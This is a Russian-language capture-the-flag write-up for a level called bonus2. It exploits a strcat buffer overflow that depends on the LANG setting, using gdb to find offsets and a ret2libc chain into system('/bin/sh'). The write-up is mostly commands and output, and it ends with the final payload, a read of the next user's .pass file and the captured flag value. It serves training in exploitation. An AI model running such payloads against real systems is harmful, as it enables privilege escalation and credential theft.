# Вызов strcat уязвим для переполнения буфера
```
0x08048517 <+147>:	call   0x8048370 <strcat@plt>
```
# Мы обнаруживаем, что программа использует `memcmp` для сравнения переменной окружения LANG с 'nl' или 'fi' ...
# ... затем объединяем соответствующее сообщение 'Hello' с нашим первым аргументом

# Давайте попробуем найти, при каком смещении программа segfault перед установкой LANG
```
gdb> pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
SIGSEGV
gdb> pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 26
```
# Если переменная LANG установлена как 'nl'
```
$> export LANG='nl'
gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
SIGSEGV
gdb> pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 19
EIP+0 found at offset: 23
```
# Теперь нам нужно найти, какой argv [1] или argv [2] позволяет перезаписывать EIP
```
gdb> r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA' $(python -c "print 'B'*27")
[...]
EIP: 0x42424242 ('BBBB')
[...]
```
# Хорошо, мы видим, что можем перезаписать EIP вторым аргументом
# Затем мы воспользуемся эксплойтом ret2libc для вызова функции libc `system`
```
gdb> info func system
0xb7e6b060  system
gdb> info proc map
[...]
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
[...]
gdb> find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```
# Если мы поставим точку останова после инструкции `ret` функции` greetuser`
# Мы видим, что 4-7 байты нашего первого аргумента передаются вызову `system`
# Тогда нам просто нужно подготовить нашу полезную нагрузку
```
$> export LANG='nl'
$> ./bonus2 $(python -c "print 'DUMM' + '\x58\xcc\xf8\xb7' + 'A'*42") $(python -c "print 'A'*23 + '\x60\xb0\xe6\xb7'")
> cat /home/user/bonus3/.pass
```
>71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

# ╮(￣_￣)╭